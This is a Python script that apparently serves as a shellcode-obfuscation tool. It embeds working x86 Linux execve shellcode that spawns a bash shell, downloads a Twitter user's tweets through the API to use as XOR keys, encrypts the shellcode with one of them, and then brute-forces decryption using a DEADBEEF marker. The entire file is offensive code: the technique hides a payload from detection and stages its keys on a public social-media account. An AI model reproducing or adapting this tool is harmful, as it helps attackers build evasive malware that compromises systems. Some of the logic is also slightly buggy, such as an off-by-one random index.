import tweepy
from random import randint

def crypt(key,data):
    encoded_data=""
    if type(data) is not list:
        data=data.split(",")
    if type(key) is not list:
        key=key.split(",")
    for value,data_element in enumerate(data):
        key_element=int(key[value],16)
        data_element=int(data_element,16)
        encoded_data_element=key_element^data_element
        encoded_data+="0x"
        encoded_data+='%02x' %encoded_data_element
        encoded_data+=","
    return encoded_data[:-1]


def get_keys(screen_name):
    # You need 4 keys from twitter API
    # https://developer.twitter.com/en/apps
    # from pastebin
    consumer_key = ""
    consumer_secret = ""
    access_key = ""
    access_secret = ""
    # Twitter only allows access to a users most recent 3240 tweets with this method
    tweets_list=[]
    # authorize twitter, initialize tweepy
    auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
    auth.set_access_token(access_key, access_secret)
    api = tweepy.API(auth)

    # initialize a list to hold all the tweepy Tweets
    alltweets = []
    # make initial request for most recent tweets (200 is the maximum allowed count)
    new_tweets = api.user_timeline(screen_name=screen_name, count=200)
    # save most recent tweets
    alltweets.extend(new_tweets)
    # save the id of the oldest tweet less one
    oldest = alltweets[-1].id - 1
    # keep grabbing tweets until there are no tweets left to grab
    while len(new_tweets) > 0:
        # all subsiquent requests use the max_id param to prevent duplicates
        new_tweets = api.user_timeline(screen_name=screen_name, count=200, max_id=oldest)
        # save most recent tweets
        alltweets.extend(new_tweets)
        # update the id of the oldest tweet less one
        oldest = alltweets[-1].id - 1

        #print "...%s tweets downloaded so far" % (len(alltweets))

    # transform the tweepy tweets into a 2D array that will populate the csv
    outtweets = [[tweet.text.encode("utf-8")] for tweet in alltweets]
    for element in outtweets:
        element=element[0] # take string of tweet
        element=element.encode('hex') #convert to hex
        element=[element[i:i + 2] for i in range(0, len(element), 2)] #split string to list with 2 characters
        new_line=""
        for two_character in element:
            new_line+=r"0x"+(two_character)+","
        new_line=new_line[:-1].split(",")
        tweets_list.append(new_line)
    return tweets_list


def generate_keys(shellcode,keys):
    keys_new=[]
    value_to_check_length=-1
    for value, element in enumerate(keys):
        if value_to_check_length>=value:
            continue
        else:
            if len(element) >= len(shellcode):
                keys_new.append(element)
            else:
                code=element
                value_to_check_length=value
                while len(code)<len(shellcode):
                    if value>=len(keys):
                        break
                    else:
                        code.extend(keys[value_to_check_length+1])
                        value_to_check_length+=1
                keys_new.append(code)
    return keys_new

def main():
    #If you want to pass your shellcode-paste in the next string
    shellcode = r"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
    #username from twitter
    twitter_name="mylittlepapers"
    print ("[+] %s, You`re a special" %twitter_name)
    shellcode += r"\xDE\xAD\xBE\xEF\xDE\xAD\xBE\xEF" #for decoding stuff
    shellcode=shellcode.replace(r"\x",",0x")[1:].split(",")
    print ("[+] Get tweets as key")
    keys = generate_keys(shellcode, get_keys(twitter_name))
    print ("[+] Download all %d tweets as key" %len(keys))
    type="crypt"
    if type=="crypt":
        print ("[+] XOR random key with shellcode \n%s\n" %str(shellcode))
        key_number=randint(0,len(keys))
        crypted_shellcode=crypt(keys[key_number], shellcode)
        print ("[+] Get next crypted shellcode %s\n with next key %s\n" % (str(crypted_shellcode),str(keys[key_number][0:len(shellcode)])))
    type="decrypt"
    if type=="decrypt":
        decrypted_shellcode=""
        i=0
        print ("[+] TRY TO DECRYPT")
        while "0xde,0xad,0xbe,0xef,0xde,0xad,0xbe,0xef" not in decrypted_shellcode:
            decrypted_shellcode=crypt(keys[i], crypted_shellcode)
            i+=1
        if "0xde,0xad,0xbe,0xef,0xde,0xad,0xbe,0xef" not in decrypted_shellcode:
            print "[-] CANT FIND KEY"
        else:
            print "[+] Find key %s" %(str(keys[i][0:len(shellcode)]))
            print "[+] Decrypted shellcode:%s" %(str(decrypted_shellcode).replace(",0xde,0xad,0xbe,0xef,0xde,0xad,0xbe,0xef",""))




if __name__ == "__main__":
    main()
